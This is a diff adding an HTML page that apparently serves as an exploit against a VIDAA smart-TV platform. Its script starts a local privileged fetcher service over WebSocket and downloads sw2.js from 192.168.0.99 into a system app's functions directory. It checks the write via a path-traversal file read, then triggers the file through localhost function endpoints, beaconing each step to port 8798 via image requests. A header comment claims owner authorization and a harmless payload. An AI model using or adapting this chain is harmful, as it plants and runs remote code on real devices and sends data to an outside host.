@@ -1,0 +1,72 @@
+<!doctype html>
+<!-- u7s1 — OWNER-AUTHORIZED: write sw2.js into fetch functions dir, trigger FaaS
+     with harmless superwatch uninstall-83 for nonexistent package "re.probe".
+     Exfil every step via img GET to :8798. -->
+<html><head><meta charset="utf-8"><title>u7s1</title></head>
+<body style="background:#000;color:#0f0;font:16px monospace"><pre id="out">u7s1…</pre>
+<script>
+(function(){var out=document.getElementById("out");
+function exfil(t){try{new Image().src="http://192.168.0.99:8798/s?d="+encodeURIComponent(String(t).slice(0,200));}catch(e){}}
+function line(t){out.textContent+="\n"+t;exfil(t);}
+function hi(a,p){try{return HiUtils_createRequest(a,p);}catch(e){return {exc:String(e)};}}
+var BASE="http://192.168.0.99:8799/";
+var TARGET="/APPS/pkgs/tv.vidaa.jsservice.basic/CHA/functions/fetch/sw2.js";
+
+function startFetcher(){
+  return new Promise(function(res){
+    try{
+      var ws=new WebSocket("wss://localhost:9888");
+      ws.onopen=function(){
+        ws.send(JSON.stringify({path:"phoenix://service/basic/fetcher",method:"start",
+                                parameters:{},session:911,timeout:10}));
+        setTimeout(function(){try{ws.close();}catch(e){} res("fetcher start OK");},1200);
+      };
+      ws.onerror=function(){res("fetcher start WS-ERROR");};
+      setTimeout(function(){res("fetcher start TIMEOUT");},5000);
+    }catch(e){res("fetcher start EXC "+e.message);}
+  });
+}
+
+function fetchFile(name,target){
+  return new Promise(function(res){
+    var args=JSON.stringify({url:BASE+name,directory:target,permission:420});
+    try{
+      var r=vowOS.service.syncExecute("basic/fetcher",{api:"fetchFile",args:args});
+      res(name+" -> "+JSON.stringify(r.ret)+" "+JSON.stringify(r.msg).slice(0,80));
+    }catch(e){res(name+" EXC "+e.message);}
+  });
+}
+
+function verify(){
+  return new Promise(function(res){
+    var r=hi("fileRead",{path:["../APPS/pkgs/tv.vidaa.jsservice.basic/CHA/functions/fetch/sw2.js"],mode:6});
+    res("readback ret="+r.ret+" len="+(r.ret?String(r.msg).length:0));
+  });
+}
+
+function trigger(){
+  return new Promise(function(res){
+    var outs=[];
+    ["https://localhost:9888/function/basic/fetch/sw2",
+     "https://localhost:9888/function/system/fetch/sw2"].forEach(function(u){
+      try{
+        var x=new XMLHttpRequest();
+        x.open("POST",u,false);
+        x.setRequestHeader("identifier","");
+        x.send(JSON.stringify({list:["90:83:90;re.probe"]}));
+        outs.push(u.replace("https://localhost:9888","")+" -> "+String(x.responseText||"").slice(0,300));
+      }catch(e){outs.push(u.replace("https://localhost:9888","")+" EXC "+e.name+":"+e.message);}
+    });
+    res("trigger "+outs.join(" | "));
+  });
+}
+
+setTimeout(async function(){
+  line(await startFetcher());
+  line(await fetchFile("sw2.js",TARGET));
+  line(await verify());
+  line(await trigger());
+  line("done");
+},400);
+})();
+</script></body></html>
